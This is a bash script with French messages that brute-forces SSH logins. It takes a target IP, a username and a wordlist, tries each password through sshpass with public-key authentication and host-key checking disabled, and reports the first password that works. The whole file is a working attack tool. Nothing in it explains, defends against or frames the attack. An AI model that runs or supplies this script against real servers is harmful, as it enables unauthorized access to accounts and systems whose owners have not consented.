#!/bin/bash

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <IP_CIBLE> <UTILISATEUR> <FICHIER_WORDLIST>"
    exit 1
fi

TARGET_IP=$1
USERNAME=$2
WORDLIST=$3

if [ ! -f "$WORDLIST" ]; then
    echo "[-] Erreur : Le fichier de mots de passe '$WORDLIST' est introuvable."
    exit 1
fi

echo "[*] Lancement du Brute Force SSH (sans clés publiques)..."

while IFS= read -r password; do
    [ -z "$password" ] && continue

    echo "--------------------------------------------------"
    echo "Test en cours avec le mot de passe : $password"

    # -o PubkeyAuthentication=no force l'utilisation exclusive du mot de passe
    sshpass -p "$password" ssh -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$USERNAME@$TARGET_IP" exit < /dev/null

    if [ $? -eq 0 ]; then
        echo -e "\n[+] VRAI SUCCÈS ! Mot de passe trouvé : $password"
        exit 0
    else
        echo "[-] Échec, passage au mot de passe suivant..."
    fi

done < "$WORDLIST"

echo "[-] Fin du test : Aucun mot de passe n'a fonctionné."